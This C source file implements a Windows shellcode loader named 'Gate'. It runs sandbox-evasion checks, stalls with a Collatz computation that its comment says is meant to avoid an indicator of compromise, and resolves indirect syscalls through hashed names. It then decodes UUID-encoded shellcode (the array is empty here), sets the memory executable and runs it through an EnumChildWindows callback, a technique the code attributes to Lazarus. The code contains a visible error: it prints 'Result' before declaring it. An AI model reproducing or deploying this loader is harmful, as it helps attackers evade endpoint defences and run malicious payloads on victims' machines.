#include <common.h>

GATE Gate;

UINT64 CollatzConjecture(UINT64 Number, UINT64 Modulus, UINT64 Depth) {
    if (Depth == 0)      return Number;
    if (Number % 2 == 0) return CollatzConjecture((Number / 2) % Modulus, Modulus, Depth - 1);
    else                 return CollatzConjecture((3 * Number + 1) % Modulus, Modulus, Depth - 1);
}

const char* uuids[] = {};

VOID Entry() {
    InitializeGate();
    DEBUG_PRINT("[+] Gate opened");
    DEBUG_PRINT("[*] Collatz chain complete. Result: %X", Result);

    // Sandbox checks before we get into syscalls
    LPVOID MemNumaCheck = Gate.Win32.VirtualAllocExNuma((HANDLE)-1, NULL, 0x1000, 0x3000, 0x4, 0);
    if (!MemNumaCheck) {
        DEBUG_PRINT("[!] VirtualAllocExNuma returned NULL. Bailing.");
        return;
    }

    UINT64 FlsCheck = Gate.Win32.FlsAlloc(NULL);
    if (!FlsCheck) {
        DEBUG_PRINT("[!] FlsCheck returned NULL. Bailing.");
        return;
    }

    // Waste some time and computation by trying to prove the Collatz Conjecturee
    // Data depencies + simple operations mean high compute time but (relatively) low CPU usage
    // Regardless, if you think that high-ish CPU usage is an IOC, remove it
    UINT64 Result = CollatzConjecture(9223372036854775807, 999999937, 0xdeadbeef);

    switch(InitializeModule(&Gate.Modules.Ntdll)) {
        case TRUE:
            DEBUG_PRINT("[*] Initialized Gate.Modules.Ntdll");
            break;
        case FALSE:
            DEBUG_PRINT("[*] Failed to initialize Gate.Modules.Ntdll");
            return;
    }

    DEBUG_PRINT("[+] NTDLL structure");
    DEBUG_PRINT("[*] \\---BaseAddress:         %p", Gate.Modules.Ntdll.BaseAddress);
    DEBUG_PRINT("[*] \\---ImgDosHdr:           %p", Gate.Modules.Ntdll.ImgDosHdr);
    DEBUG_PRINT("[*] \\---ImgNtHdrs:           %p", Gate.Modules.Ntdll.ImgNtHdrs);
    DEBUG_PRINT("[*] \\---ImgExpDir:           %p", Gate.Modules.Ntdll.ImgExpDir);
    DEBUG_PRINT("[*] \\---ArrayOfFunctions:    %p", Gate.Modules.Ntdll.ArrayOfFunctions);
    DEBUG_PRINT("[*] \\---ArrayOfNames:        %p", Gate.Modules.Ntdll.ArrayOfNames);
    DEBUG_PRINT("[*] \\---ArrayOfOrdinals:     %p", Gate.Modules.Ntdll.ArrayOfOrdinals);

    switch(InitializeSyscalls()) {
        case TRUE:
            DEBUG_PRINT("[*] Initialized syscalls");
            break;
        case FALSE:
            DEBUG_PRINT("[*] Failed to initialize syscalls");
            return;
    }

    DEBUG_PRINT("[i] RPCRT4::UuidFromStringA: %X::%X", Gate.Modules.RPCRT4.BaseAddress, Gate.Win32.UuidFromStringA);

    int elems = sizeof(uuids) / sizeof(uuids[0]);

    // Exact same Lazarus chain as before

    PREP_SYSCALL(Gate.Win32.SHASH_STR("NtAllocateVirtualMemory"));
    PVOID mem = 0;
    SIZE_T regionSize = sizeof(uuids) * 2;
    DEBUG_PRINT("[*] regionSize: %lu", regionSize);
    NTSTATUS status = HellHall((HANDLE)-1, &mem, 0, (PULONG)&regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status) {
        DEBUG_PRINT("    [!] Error calling NtAllocateVirtualMemory: %X", status);
    }

    DWORD_PTR hptr = (DWORD_PTR)mem;
    for (int i = 0; i < elems; i++) {
        DEBUG_PRINT("[*] Allocating %d of %d uuids", i + 1, elems);
        RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
        RPC_STATUS status = Gate.Win32.UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
        if (status != RPC_S_OK) {
        DEBUG_PRINT("[-] UUID convert error");
        Gate.Win32.CloseHandle(mem);
        return;
        }
        hptr += 16;
    }

    DWORD oldProtect = 0;
    PREP_SYSCALL(Gate.Win32.SHASH_STR("NtProtectVirtualMemory"));
    NTSTATUS result = HellHall((HANDLE)-1, &mem, &regionSize, PAGE_EXECUTE_READ, &oldProtect);
    if (result)
    {
        DEBUG_PRINT("    [Error] Could not change the memory protection settings: error %X", result);
        return;
    }
    DEBUG_PRINT("   [+] Successfully changed the memory protection settings of %X to RX", mem);


    Gate.Win32.EnumChildWindows(NULL, (WNDENUMPROC)mem, 0);
    Gate.Win32.CloseHandle(mem);

    DEBUG_PRINT("[*] Done");    
}
